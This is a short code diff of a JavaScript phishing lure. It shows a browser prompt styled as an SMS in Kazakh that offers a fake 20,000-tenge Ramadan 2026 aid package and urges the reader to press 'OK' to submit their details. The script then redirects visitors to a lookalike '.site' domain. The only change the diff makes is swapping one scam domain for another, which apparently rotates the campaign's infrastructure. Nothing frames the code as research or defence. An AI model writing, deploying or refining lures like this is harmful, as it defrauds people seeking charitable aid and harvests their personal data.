@@ -1,5 +1,5 @@
 var password = 'Казір отініш берініз'
 password=prompt('SMS: Ассаламу алейкум, Сізді 2026 Жылы Рамазан айына арналган 20,000 т келеміндегі кемек пакетін алуга шакырамыз. Акпаратынызды казір жіберу ушін "Жарайды" туймесін басыныз.','Казір отініш берініз');
 if (password != 'Казір отініш берініз') {
-location.href='https://www.krhitid.site/Kzt20000-ramadan';
+location.href='https://www.vrhmfed.site/Kzt20000-ramadan';
 }
